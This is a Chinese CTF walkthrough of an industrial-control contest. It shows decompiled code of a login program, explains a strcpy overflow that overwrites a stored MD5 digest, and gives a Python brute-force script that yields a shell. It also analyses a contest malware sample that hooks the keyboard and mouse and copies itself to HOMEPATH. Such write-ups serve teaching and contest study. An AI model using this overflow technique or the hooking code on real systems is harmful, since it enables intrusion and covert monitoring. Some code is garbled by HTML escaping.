> 原文链接: https://www.anquanke.com//post/id/87191 


# 【CTF 攻略】极棒GeekPwn工控CTF Writeup


                                阅读量   
                                **235275**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01ea4fe3a37fd84254.png)](https://p5.ssl.qhimg.com/t01ea4fe3a37fd84254.png)

作者：[FlappyPig](http://bobao.360.cn/member/contribute?uid=1184812799)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**写在前面：**

****

这次的卡巴斯基主办的工控CTF乐趣和槽点都非常的多，两个主办方小哥都非常的帅。但是有一个小哥的英语带着浓浓的俄罗斯风格，想听懂他的意思要听好几遍..

整个工控CTF模拟渗透某工业企业的内网，从Wifi入手。

简单来说，就是开局给你一个wifi和一个U盘，其他全靠猜…



**0x01# RShell.dmp**

****

刚开始的时候主办方提供了一个U盘，情景设定就是从工厂内盗出来的文件。

里面有一个叫**Rshell.dmp**的文件，file之后发现是一个exe文件的dump。

[![](https://p1.ssl.qhimg.com/t0171d9c59657770ca7.png)](https://p1.ssl.qhimg.com/t0171d9c59657770ca7.png)

将这个dump文件反编译可以发现实际上这个实际上是一个用来登陆的程序。

main函数在**0xcc1210**这个位置上面。



```
int real_main()
`{`
  char **v0; // eax@2
  char **v1; // eax@3
  char hObject; // [sp+0h] [bp-8h]@1
  HANDLE hObjecta; // [sp+0h] [bp-8h]@2
  DWORD ThreadId; // [sp+4h] [bp-4h]@1
  ThreadId = 0;
  hObject = (unsigned int)CreateThread(0, 0, StartAddress, 0, 0, &amp;ThreadId);
  if ( auth() )
  `{`
    print((int)aCredentialsAre, hObject);
    v1 = get_fd();
    fflush((FILE *)v1 + 1);
  `}`
  else
  `{`
    print((int)aRemoteAssistan, hObject);
    v0 = get_fd();
    fflush((FILE *)v0 + 1);
    system(aCmd);
  `}`
  CloseHandle(hObjecta);
  return 0;
`}`
```

如果通过验证的话，就会将会得到一个主机的shell。就是要想办法让这个auth函数返回0。auth函数的大体逻辑是这样的。



```
int auth()
`{`
  char **fd; // eax@1
  char v2; // [sp+0h] [bp-114h]@0
  int v3; // [sp+4h] [bp-110h]@5
  signed int v4; // [sp+8h] [bp-10Ch]@6
  unsigned int i; // [sp+Ch] [bp-108h]@3
  char v6; // [sp+10h] [bp-104h]@11
  char v7; // [sp+68h] [bp-ACh]@11
  char input[68]; // [sp+78h] [bp-9Ch]@1
  char first_16_bytes[16]; // [sp+BCh] [bp-58h]@1
  char v10; // [sp+CCh] [bp-48h]@1
  char md5_digest[16]; // [sp+100h] [bp-14h]@1
  md5_digest[0] = 0;
  md5_digest[1] = 0xF;
  md5_digest[2] = 1;
  md5_digest[3] = 0xE;
  md5_digest[4] = 2;
  md5_digest[5] = 0xD;
  md5_digest[6] = 3;
  md5_digest[7] = 0xC;
  md5_digest[8] = 4;
  md5_digest[9] = 0xB;
  md5_digest[10] = 5;
  md5_digest[11] = 0xA;
  md5_digest[12] = 6;
  md5_digest[13] = 9;
  md5_digest[14] = 7;
  md5_digest[15] = 8;
  print((int)aPleaseAuthoriz, v2);
  fd = get_fd();
  fflush((FILE *)fd + 1);
  memset(input, 0, 68u);
  memset(first_16_bytes, 0, 16u);
  memset(&amp;v10, 0, 52u);
  while ( !scanf(a68s, input) )
    ;
  memmove(first_16_bytes, input, 0x10u);
  for ( i = 0; i &lt; 0x10; ++i )
  `{`
    v3 = isprint(first_16_bytes[i]) == 0;
    if ( first_16_bytes[i] == aRemoteassistan[i] )
      v4 = 0;
    else
      v4 = -1;
    if ( v4 + v3 )
      return -1;
  `}`
  strcpy(&amp;v10, &amp;input[16]);
  MD5_init((int)&amp;v6);
  MD5_update((int)&amp;v6, &amp;v10, 0x34u);
  MD5_final(&amp;v6);
  return memcmp(md5_digest, &amp;v7, 0x10u);
`}`
```

**1. 设置了最后内置的md5比较值md5_digest，<br>**

**2. 读入了68个字节到input里面**

**3. memmove了input的前16个字节到first_16_bytes里面**

**4. 判断first_16_bytes是不是可见字符，并且和"RemoteAssistant:"这个字符串进行比较**

**5. 从input的第16个字符开始往v10中进行strcpy**

**6. 对v10进行md5_hash，v6是MD5_CTX结构体digest的结果存在v7中。**

**7. 最后如果v7和md5_digest相等的话就会返回0。**

第一眼看上去的话可能就没有什么问题。但是仔细一看的话就会发现strcpy这个函数可能存在问题。

当输入正好是68字节的时候。

因为first_16_bytes正好在input后面，所以在strcpy的时候正好全部都复制到了v10里面。



```
char input[68]; // [sp+78h] [bp-9Ch]@1
  char first_16_bytes[16]; // [sp+BCh] [bp-58h]@1
  char v10; // [sp+CCh] [bp-48h]@1
  char md5_digest[16]; // [sp+100h] [bp-14h]@1
```

并且v10下面正好是md5_digest，所以会覆盖掉这个值。

但是要想做到覆盖md5_digest为任意值的话，必须要想办法过掉**if ( first_16_bytes[i] == aRemoteassistan[i] )**这个验证。



```
v3 = isprint(first_16_bytes[i]) == 0;
    if ( first_16_bytes[i] == aRemoteassistan[i] )
      v4 = 0;
    else
      v4 = -1;
    if ( v4 + v3 )
      return -1;
```

这里的这段代码实际上是可以bypass掉的。因为如果isprint的参数不是可见字符的话，isprint就会返回1。那么这样的话first_16_bytes就可以不用等于"RemoteAssistant:"这个字符串了。

所以我们必须要找到一个md5 digest全部都是不可见字符的52bytes字符串。这样在进行strcpy的时候才能够覆盖掉md5_digest，通过验证。

另外当时有个比较坑的地方是strcpy是通过NULLbyte来判断有没有结束的，所以md5_digest的最后一个字节应该是**x00**。



```
import hashlib
import string
def MD5(s):
    return hashlib.md5(s).digest()
def check(s):
    for i in s:
        if i in string.printable:
            return False
    if s[-1:] != 'x00':
        return False
    return True
#print len(MD5('1'))
a = 'a' * 49
for i in range(1, 255):
    for j in range(1, 255):
        for k in range(1, 255):
            md5_value = MD5(a + chr(i) + chr(j) + chr(k))
            if check(md5_value):
                print a + chr(i) + chr(j) + chr(k)
                print MD5(a + chr(i) + chr(j) + chr(k)).encode('hex')
```

爆破出来一个string的值，把它的md5加在前面直接发送到服务器就能得到一个windows的shell。之后可以进行下面的步骤了



**0x02# 步步是坑**

****

通过Nmap扫描C端，会发现C端下有一台机器开着7777端口。

使用exp拿到简单权限。

之后坑点就来了… 我们一直纠结着怎么提权，然后想进行下一步渗透。

尝试了大概半个多小时无果，后来主办方过来问我们做到什么地步了,如实回答。主办方小哥告诉我们不用提权，只需要找可疑文件。于是开始寻找可疑文件

 [![](https://p2.ssl.qhimg.com/t01b50ba2ba5445d045.png)](https://p2.ssl.qhimg.com/t01b50ba2ba5445d045.png)

在某共享目录下找到了一个encase文件，**3.6GB**。

用了半个多小时尝试如何下载它..

这个时候主办方又过来了，问我们到什么程度了。继续如实回答，主办方小哥说只要你们找到这个文件我们就会给你一个U盘，里面就是这个文件。

我们：WTF？？？？？

全场最大的坑点来了，如何正确的加载encase文件并提取里面的东西。

这个步骤花了我们两个小时.. 因为大部分软件都是收费，绿色版又太过时了用不了的原因。

导致本来就浪费了很多的解题时间基本就没有了..

最后的解决方式是用mountimage挂载磁盘，再用diskgenius查看文件，找到了可疑文件Malware。

<br>

**0x03# Malware **

这个malware是从机器的镜像上面提取出来的，通过分析这个malware能够找到下面所需要做的事情。

main函数的代码，这个代码是我已经分析并且patch过的了。



```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  char **v3; // rbx
  unsigned int v4; // er8
  FILE *v5; // rax
  unsigned int v6; // er8
  char v7; // al
  const char *v8; // rcx
  char *v9; // rdx
  signed __int64 idx; // r8
  _QWORD *v11; // rbx
  _QWORD *v12; // rax
  __int64 v13; // rax
  __int64 v14; // rbx
  void *v15; // rax
  _QWORD *v16; // rax
  _QWORD *v17; // rax
  char v19; // [rsp+20h] [rbp-E0h]
  char *v20; // [rsp+28h] [rbp-D8h]
  __int64 v21; // [rsp+38h] [rbp-C8h]
  char homepath; // [rsp+40h] [rbp-C0h]
  char v23; // [rsp+60h] [rbp-A0h]
  char v24; // [rsp+80h] [rbp-80h]
  struct tagMSG Msg; // [rsp+A0h] [rbp-60h]
  const void *file_path[4]; // [rsp+D0h] [rbp-30h]
  const void *v27[4]; // [rsp+F0h] [rbp-10h]
  const void *user_profile[4]; // [rsp+110h] [rbp+10h]
  char Dst; // [rsp+130h] [rbp+30h]
  v21 = -2i64;
  v3 = (char **)argv;
  if ( (signed int)time64(0i64) &lt;= 0x7AFFFF7F )
  `{`
    LODWORD(v5) = write(
                    (unsigned __int64)&amp;stdout,
                    "Hello. This program written only for industrial ctf final. Don't use it for any purporse",
                    v4);
    fflush_0(v5);
    v7 = 0;
    v19 = 0;
    while ( v7 != 78 )
    `{`
      write((unsigned __int64)&amp;stdout, "Write [Y]/[N] to continue: ", v6);
      scanf(v8, &amp;v19);
      v7 = toupper(v19);
      v19 = v7;
      if ( v7 == 'Y' )
      `{`
        if ( check_volume_serial_num() )
        `{`
          get_cur_path(&amp;Dst);                   // RAX : 000000000012FEE0     &amp;L"C:\Users\test\Desktop\industrial_ctf_final_malware.exe"
                                                // 
                                                // 
          get_user_profile(user_profile);       // RAX : 000000000012FEC0     &amp;L"C:\Users\test\"
                                                // 
          v9 = *v3;
          idx = -1i64;
          do
            ++idx;
          while ( v9[idx] );
          sub_14000B500(v27, (__int64)v9, (__int64)&amp;v9[idx]);
          v11 = sub_14000B590((__int64)&amp;v24);
          v12 = sub_140009C50((__int64)&amp;v23, user_profile);
          strcat(file_path, (__int64)v12, v11); // [rbp-30]:L"C:\Users\test\industrial_ctf_final_malware.exe"
          finalize((const void **)&amp;v23, 1, 0i64);
          finalize((const void **)&amp;v24, 1, 0i64);
          v13 = sub_140004CD0(file_path, (__int64)&amp;homepath);
          if ( (unsigned __int8)sub_140005740(v13) )
          `{`
            v17 = (_QWORD *)sub_14000D3E0();
            sub_14000D8D0(v17);
            while ( GetMessageA(&amp;Msg, 0i64, 0, 0) )
            `{`
              TranslateMessage(&amp;Msg);
              DispatchMessageA(&amp;Msg);
            `}`
          `}`
          else
          `{`
            v20 = &amp;homepath;
            v14 = sub_140004CD0(file_path, (__int64)&amp;homepath);
            v15 = sub_140006490(&amp;Msg, v27);
            if ( registry((__int64)v15, v14) )
            `{`
              v16 = sub_140009C50((__int64)&amp;Msg, v27);
              clean((__int64)v16);
            `}`
          `}`
          finalize(file_path, 1, 0i64);
          finalize(v27, 1, 0i64);
          finalize(user_profile, 1, 0i64);
          finalize((const void **)&amp;Dst, 1, 0i64);
        `}`
        return 0;
      `}`
    `}`
  `}`
  return 0;
`}`
```

可以看到它首先是获得了一个时间戳，通过这个时间戳来判断程序是否执行。

之前的时间戳恰好是1024比赛开始之前，因此我patch了这个时间，好让程序能够继续的执行。

之后是在check_volume_serial_num函数里面检查了卷的序列号



```
bool check_volume_serial_num()
`{`
 [...]
  GetDriveTypeA(0i64);
  if ( !GetVolumeInformationA(
          0i64,
          &amp;VolumeNameBuffer,
          0x104u,
          &amp;VolumeSerialNumber,
          &amp;MaximumComponentLength,
          &amp;FileSystemFlags,
          &amp;FileSystemNameBuffer,
          0x104u) )
    return 0;
   [...]
  return VolumeSerialNumber == 0x2D98666;
`}`
```

patch掉这个返回的比较，把判断相等变成判断不相等就能够继续进行动态的调试了。

之后在  **if ( (unsigned __int8)sub_140005740(v13) ) **check了一下malware所运行位置是不是HOMEPATH。

如果不是的话，就进入下面的流程，把这个程序复制到HOMEPATH里面，然后删除当前的程序。

如果是在HOMEPATH里面执行的话，就进入**sub_14000D8D0**里面操作。



```
__int64 __fastcall sub_14000D8D0(_QWORD *a1)
`{`
[...]
  v2 = GetModuleHandleA(0i64);
  v3 = v2;
  if ( !v2 )
    exit(1);
  v1[5] = SetWindowsHookExA(13, fn, v2, 0);
  v1[6] = SetWindowsHookExA(14, fn, v3, 0);
  create_folder(&amp;folder);
  sub_14000FC30();
  sub_14000FC30();
  folder = (__int64 *)&amp;folder;
  v5 = Stat(folder, &amp;v15);
  v6 = v5 != 8 &amp;&amp; v5 != -1;
  v7 = v6 == 0;
  finalize((const void **)&amp;folder, 1, 0i64);
  if ( v7 )
  `{`
    create_folder(&amp;folder);
    sub_14000BB40(&amp;folder);
    finalize((const void **)&amp;folder, 1, 0i64);
  `}`
  v10 = sub_14000D750(v8, &amp;folder);
  v15 = v10;
  if ( v1 + 55 != v10 )
    sub_140003050(v1 + 55);
  LOBYTE(v9) = 1;
  return std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::_Tidy(v10, v9, 0i64);
`}`
```

这个函数大致的处理流程是这样子的，首先通过**SetWindowsHookExA**对事件**WH_KEYBOARD_LL**和事件**WH_MOUSE_LL**进行了hook。

fn函数就是当有键盘操作或者鼠标点击的时候在data文件家里面创建截图。



```
LRESULT __fastcall fn(int code, WPARAM wParam, LPARAM lParam)
`{`
  LPARAM v3; // rsi
  WPARAM v4; // rdi
  int v5; // er14
  _QWORD *v6; // rbx
  _QWORD *v7; // rbx
  __m128i v8; // xmm6
  __int64 v9; // rax
  __int64 v10; // rcx
  char v12; // [rsp+38h] [rbp-A0h]
  __int128 v13; // [rsp+48h] [rbp-90h]
  __int64 Dst; // [rsp+58h] [rbp-80h]
  __int64 v15[2]; // [rsp+60h] [rbp-78h]
  __int64 v16; // [rsp+70h] [rbp-68h]
  void **v17; // [rsp+F0h] [rbp+18h]
  Dst = -2i64;
  v3 = lParam;
  v4 = wParam;
  v5 = code;
  v6 = *(_QWORD **)&amp;qword_140110118;
  if ( !*(_QWORD *)&amp;qword_140110118 )
  `{`
    v7 = operator new(0x1D8ui64);
    memset(v7, 0, 0x1D8ui64);
    v6 = sub_14000BCC0(v7);
    *(_QWORD *)&amp;qword_140110118 = v6;
  `}`
  if ( v5 &gt;= 0 )
  `{`
    if ( !((v4 - 256) &amp; 0xFFFFFFFFFFFFFFFBui64) )
    `{`
      *(_QWORD *)&amp;v13 = *(_QWORD *)(v3 + 16);
      switch ( *(_DWORD *)v3 )
      `{`
        case 0xA0:
          *((_BYTE *)v6 + 36) = 1;
          break;
        case 0xA1:
          *((_BYTE *)v6 + 37) = 1;
          break;
        case 0xA2:
          *((_BYTE *)v6 + 34) = 1;
          break;
        case 0xA3:
          *((_BYTE *)v6 + 35) = 1;
          break;
        case 0xA4:
          *((_BYTE *)v6 + 32) = 1;
          break;
        case 0xA5:
          *((_BYTE *)v6 + 33) = 1;
          break;
        default:
          sub_14000DA20((__int64)v6, *(_DWORD *)v3);
          break;
      `}`
    `}`
    if ( !((v4 - 257) &amp; 0xFFFFFFFFFFFFFFFBui64) )
    `{`
      *(_QWORD *)&amp;v13 = *(_QWORD *)(v3 + 16);
      switch ( *(_DWORD *)v3 )
      `{`
        case 0xA0:
          *((_BYTE *)v6 + 36) = 0;
          break;
        case 0xA1:
          *((_BYTE *)v6 + 37) = 0;
          break;
        case 0xA2:
          *((_BYTE *)v6 + 34) = 0;
          break;
        case 0xA3:
          *((_BYTE *)v6 + 35) = 0;
          break;
        case 0xA4:
          *((_BYTE *)v6 + 32) = 0;
          break;
        case 0xA5:
          *((_BYTE *)v6 + 33) = 0;
          break;
        default:
          break;
      `}`
    `}`
    if ( v4 == 0x201 || v4 == 0x206 )
    `{`
      v8 = *(__m128i *)v3;
      v13 = *(_OWORD *)(v3 + 16);
      memset(&amp;Dst, 0, 0xF8ui64);
      sub_14000E290(&amp;Dst);
      _mm_storeu_si128((__m128i *)v15, (__m128i)0i64);
      v16 = 0i64;
      sub_140010E70(_mm_cvtsi128_si32(v8) - 50, _mm_cvtsi128_si32(_mm_srli_si128(v8, 4)) - 50, (__int64)v15);
      v9 = sub_140006300(&amp;v12, v15);
      sub_1400050F0(v10, v9);
      v15[1] = v15[0];
      sub_140007BB0(v15);
      sub_14000E150(&amp;v17);
      v17 = &amp;std::ios_base::`vftable';
      std::ios_base::_Ios_base_dtor((struct std::ios_base *)&amp;v17);
    `}`
  `}`
  return CallNextHookEx((HHOOK)v6[5], v5, v4, v3);
`}`
```

大致的结果如下

 [![](https://p5.ssl.qhimg.com/t01cb1e8dfe94f87006.jpg)](https://p5.ssl.qhimg.com/t01cb1e8dfe94f87006.jpg)

所以之后的工作就是到用户目录的data文件夹下找下一步的线索。

Data目录在上一步挂载的磁盘中，后续的题目还没来得及跟进。

<br>

**0x04# 写在最后**

****

非常感谢GeekPwn官方给了这次参加工控CTF的机会，也感受到了自己实力的不足。

有想研究题目的可以微博私信[**@MMMXny**](https://weibo.com/u/1390260711)，我可以分享文件给你。
